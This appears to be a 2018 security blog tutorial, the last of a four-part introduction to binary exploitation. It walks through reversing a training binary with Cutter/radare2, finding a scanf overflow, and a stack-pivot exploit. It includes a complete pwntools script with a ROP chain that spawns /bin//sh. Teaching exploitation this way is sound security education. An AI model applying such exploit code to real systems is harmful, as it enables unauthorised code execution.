@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.52" />
+
+    
+    
+    
+
+<title>PWN 4/4 : Stack Pivot ToZeMoon ! • Think
+Love
+Share</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PWN 4/4 : Stack Pivot ToZeMoon !"/>
+<meta name="twitter:description" content="The basics of binary operation are normally acquired, let&#39;s go for a practical operation with a stack pivot!"/>
+
+<meta property="og:title" content="PWN 4/4 : Stack Pivot ToZeMoon !" />
+<meta property="og:description" content="The basics of binary operation are normally acquired, let&#39;s go for a practical operation with a stack pivot!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://thinkloveshare.github.io/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/" /><meta property="article:published_time" content="2018-05-10T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2018-05-10T00:00:00&#43;00:00"/>
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container sidebar-about ">
+      <span class="site__title">
+        <a href="https://thinkloveshare.github.io//en">Think
+Love
+Share</a>
+      </span>
+          <a href="https://thinkloveshare.github.io//en">
+          
+          
+          
+          <div class="author-image">
+            <img src="https://thinkloveshare.github.io/img/laluka.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+      <p class="site__description">
+        <a href="https://thinkloveshare.github.io//en">
+         Infosec, Coding, Thoughts &amp; Feels 
+      </a>
+      </p>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/en/hacking/">
+						<span>Hacking</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/coding/">
+						<span>Coding</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/the_rest/">
+						<span>The Rest</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/travels/">
+						<span>Travels</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/en/about/">
+						<span>About</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/thelaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	<a href="https://github.com/TheLaluka" rel="me"><i class="rotate fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	<a href="https://linkedin.com/in/louka-jacques-chevallier-6b2460125" rel="me"><i class="rotate fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+	
+  &nbsp;<a href="https://www.root-me.org/DeveLooper" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
+  
+</section>
+
+    </p>
+    <div class="langSection">
+    
+    <a rel="alternate" href="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
+    
+    <a rel="alternate" href="/fr/hacking/pwn_4of4_stak_pivot_to_ze_moon/" hreflang="fr" lang="fr"><img src="/img/flag_fr.png" alt="flag_fr" class="logoFlag"/></a>
+    </div>
+    <p class="copyright">
+      &copy; 2019 Laluka.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>PWN 4/4 : Stack Pivot ToZeMoon !</h1>
+    
+    
+<div class="post__meta">
+    
+      <i class="fas fa-calendar-alt"></i> May 10, 2018
+    
+    
+    <i class="fas fa-clock"></i> 7 min read
+    <i class="fas fa-globe"></i> translated<br/>
+    <i class="fas fa-heart"></i>
+    
+    Any typos? Any idea to suggest? Feedback appreciated!
+    <i class="fas fa-heart"></i><br/>
+</div>
+
+
+  </header>
+  <hr/>
+  <div class="post">
+    
+
+<blockquote>
+<p>Small edit after the initial publication of the articles:</p>
+
+<p>These four articles lead me to give an &ldquo;pwn introductory&rdquo; conference at the HitchHack 2018. It summarizes the first 3 articles but goes less into detail. If this format suits you better, the slides are downloadable <a href="/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf">here</a> and the video (French only) here :</p>
+</blockquote>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//www.youtube.com/embed/hmt8M9YLwTg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<h2 id="pwn-road-last-introductory-article">Pwn Road, last introductory article!</h2>
+
+<p>I promised you some heavy stuff for the final, and what is said, is due!</p>
+
+<p>The exploit will not be very long, but here&rsquo;s the program: A nice technique, some reverse, and an open source tool that you&rsquo;ll dream of!</p>
+
+<p>You who stood strong during the previous 3 articles, I hope you are still ready!</p>
+
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/lets_go.jpg" alt="lets_go" ></p>
+
+<h2 id="recon">Recon</h2>
+
+<p>The studied binary is downloadable <a href="/hacking/pwn_4of4_stack_pivot/vuln">here</a> !</p>
+
+<p>Hello little program, what do you do for a living?</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/recon.png" alt="recon" ></p>
+
+<p>Meh, not much&hellip;</p>
+
+<p>Let&rsquo;s take our first tool: Radare2!</p>
+
+<p>I hesitated between presenting its command line interface, or its graphical interface. But there is so much development and effort done on their GUI that I want to present this version.</p>
+
+<p>So I present you Cutter, based on radare2, which is a very advanced reverse engineering tool. For the record, radare2 is intended to be as standalone (independent) as possible, i.e. you can use it on a particular device / architecture, even if it does not have any tool / package preinstalled. All you have to do is recompile it in situ or cross-compile it. As a &lsquo;bonus&rsquo;, many classic admin-sys tools are integrated! A paradise for embded devices, remote control of a watch, phone, or whatever you like.</p>
+
+<p>It is open source, and its developers are very active, so prefer an installation via their git&hellip; :)</p>
+
+<p>Official website here: <a href="https://rada.re/r/">https://rada.re/r/</a></p>
+
+<p>It&rsquo;s full of easter eggs, if you have time to waste, enjoy! ;)</p>
+
+<p>I know that the screenshot is difficult to read in its normal size, but I uploaded the source resolution, you can (should) zoom as close as you want!</p>
+
+<p>Sorry / Not sorry, your vision is now blurry! <code>¯\_(ツ)_/¯</code></p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/cutter.png" alt="cutter" ></p>
+
+<p>Brief presentation of the interface:</p>
+
+<ul>
+<li>On the left:</li>
+</ul>
+
+<p>The different functions of the program. We&rsquo;re lucky, the program isn&rsquo;t stripped, so it still contains the names of the functions. Otherwise, we would only have generic names that could not be used easily.</p>
+
+<ul>
+<li>On the right:</li>
+</ul>
+
+<p>Information on the line being inspected. Not very useful at the moment.</p>
+
+<ul>
+<li>Up:</li>
+</ul>
+
+<p>An overview of the program structure. Code, data, recognizable patterns for crypto,&hellip;</p>
+
+<ul>
+<li>Down:</li>
+</ul>
+
+<p>A console of logs (with already an easter egg!) and the different sections of the program and their information.</p>
+
+<ul>
+<li>In the middle:</li>
+</ul>
+
+<p>The analysis tool in use.</p>
+
+<p>Here, the dashboard proudly tells us: Bruhhh, I looked a little bit, and you seeeee, I found that your target thereeee, well it&rsquo;s an ELF, in 32 bits, initially coded in C, without stack canary, without cryptographic protection, its stack is NX, the PIC is disabled. It is not stripped, also it&rsquo;s compiled in static! :D</p>
+
+<p>Isn&rsquo;t it great all these information with just a finger snap!</p>
+
+<p>So&hellip; Get it ?  °^°</p>
+
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/ffs.jpg" alt="ffs" ></p>
+
+<p>A quick overview of the execution flow (from the main), still with Cutter :</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/graph_call.png" alt="graph_call" ></p>
+
+<p>Way too lazy to analyze it in depth&hellip; Pseudo code please?</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pseudo_code.png" alt="pseudo_code" ></p>
+
+<p>We immediately see that the decompilation is partial, we see a lot of interesting things, but we don&rsquo;t have a clear C code as we would like&hellip; Well, we&rsquo;ll deal with it!</p>
+
+<p>There are many lines of code, so it&rsquo;s time to learn an effective way of looking for security breach in a general hacking way: Sources and Sinks!</p>
+
+<p>A little ref to the <a href="https://www.youtube.com/watch?v=ZaOtY4i5w_U">Live Overflow</a> youtube channel, it&rsquo;s GOLD. Everything he does (hacking, pwn, web, reverse, random,&hellip;) is of an incredible quality, and he just talked about the SoSi method, so have a look!</p>
+
+<p>In short, what do we control (inputs), and what do we want to reach (dangerous functions).</p>
+
+<p>Here, we want to make a buffer overflow. So we&rsquo;re looking for vulnerable functions and inputs.</p>
+
+<ul>
+<li><p>Sources: admin name, room name, temperature</p></li>
+
+<li><p>Sinks: scanf&hellip; scanf ? scanf!</p></li>
+</ul>
+
+<p>scanf corresponds to &ldquo;room name&rdquo;. Let&rsquo;s do a few tests just to be sure that we control the crash point:</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/crash.png" alt="crash" ></p>
+
+<p>Crash confirmed!</p>
+
+<p>Before looking for the offset, there is one more thing to look for, which will <strong>MAYBEEEE</strong> be useful later&hellip; Just saying&hellip; For the curious ones, it is in the first code screenshot, for the others, the reading continues:</p>
+
+<p><em>-[ SPOIL ]-</em></p>
+
+<p>We read the following code:</p>
+
+<pre><code>push 0x3ff // size: 1023
+push obj.username // address: 0x80eb2c0 char * fgets(...) // user entry
+</code></pre>
+
+<p>In other words, the program will always put in the same place (0x80eb2c0) up to 1023 bytes entered by the user&hellip; Maybe it&rsquo;s legitimate&hellip; But it can be useful? Probably&hellip; Who knows! :)</p>
+
+<p>Now, the offset!</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_create.png" alt="pattern_create" ></p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_search.png" alt="pattern_search" ></p>
+
+<p>The program crashes on a ret: Usual, classic, cool.</p>
+
+<p>We do have ESP, good. Wait&hellip; What? We have ESP&hellip; + 4 ?</p>
+
+<p>Yes, the famous pattern is cleverly formated, clever enough to be detected even if it has been altered (a bit)!</p>
+
+<p>This means that between the time we overflow, and the time we execute the ret instruction, the stack (well, our ESP in the stack) has been altered.</p>
+
+<p>But&hellip; We have ESP + 4? Yes. Do we know how to add up? Yes.</p>
+
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/coincidence.gif" alt="coincidence" ></p>
+
+<p>I hope you&rsquo;re starting to see where we&rsquo;re going with this? :)</p>
+
+<p>We know where to store bytes. We control EIP since we control ESP on a ret. We know the offset, and we know how to modify ESP so that it takes the value of our choice&hellip; Justwreckit!</p>
+
+<p>That&rsquo;s the right time to announce you the technique we&rsquo;re going to use, a Stack Pivot!</p>
+
+<p>We will rotate the execution of our program, making it believe that the stack is where the username is, which we can define as we wish, of course.</p>
+
+<p>I pass the creation of the ropchain as it&rsquo;s exactly like in the previous article, we&rsquo;ll do our exploit right away:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+
+from pwn import *
+
+# Setting up
+context.log_level = &quot;debug&quot;
+
+ropchain = ''
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '/bin'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea344)  # @ .data + 4
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '//sh'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x080481a9)  # popayloadebx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080c18cc)  # popayloadecx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x0807b64f) * 11 # inc eax ; ret
+ropchain += p32(0x080494b1)  # int 0x80
+
+p = process(&quot;./vuln&quot;)
+p.recv()
+p.sendline(ropchain)
+p.recv()
+&quot;&quot;&quot;
+0x08048fc9 &lt;+397&gt;:	lea    esp,[ecx-0x4]
+0x08048fcc &lt;+400&gt;:	ret
+On ajoute donc 4 a user name pour compenser le -0x4
+&quot;&quot;&quot;
+usernameAddr = 0x80EB2C0
+ESP = usernameAddr + 4 # Fix the offset before ret
+p.sendline(&quot;1&quot; * 28 + p32(ESP))
+p.recv()
+p.sendline(&quot;10&quot;)
+p.recv()
+p.interactive()
+</code></pre>
+
+<p>Let&rsquo;s run it, it would be crazy to see it working at the first time, wouldn&rsquo;t it? :O</p>
+
+<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/run_exploit.png" alt="run_exploit" ></p>
+
+<p>Bim, shell, first try, too IZI mannnn!</p>
+
+<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/like_a_boss.jpg" alt="like_a_boss" ></p>
+
+<p>Except&hellip; Except it&rsquo;s not as easy.</p>
+
+<p>By reading an article like that, it doesn&rsquo;t seem that complex, a little bit messy, at most. Except that for each step, unless you are really good at it (Geluchat, Blackndoor, Pixis, Klaoude, Antoxyde, Ethnical, Reglisse&hellip;), it is hours, days (well, nights, we understand each other now ;) ) that are spend learning this. But trying hard to finally get there, what a satisfaction!</p>
+
+<p>If you also want to get started, I recommend the excellent exercise suite <a href="https://exploit-exercises.com/protostar/">Protostar</a></p>
+
+<p>As well as the classic <a href="https://www.root-me.org/">root-me</a> that I particularly like. Be careful though, this site will devour your nights&hellip; =]</p>
+
+<p>But although I love this site, I don&rsquo;t think it very appropriate to discover the binary exploit. But for all the other categories of &ldquo;classic&rdquo; hacking, go for it, it&rsquo;s a blessed bread! ;)</p>
+
+<p>That&rsquo;s how this pwn introduction ends, I hope you liked it and learned some things (at least a little? :D)</p>
+
+<p>I am very, very happy with your many feedback!</p>
+
+<p>Wishing you a happy and successful pwn,</p>
+
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/en/hacking/pwn_3of4_saperliropette/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">PWN 3/4 : SaperliROPette !</span>
+    </a>
+    
+    
+    <a href="/en/hacking/grehack_2018/" class="post--navigation-next">
+      <span class="navigation-tittle">GreHack 2018</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+        <div id="disqus_thread"></div>
+<script type="text/javascript">
+  (function() {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    var disqus_shortname = 'thinkloveshare';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-128985075-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
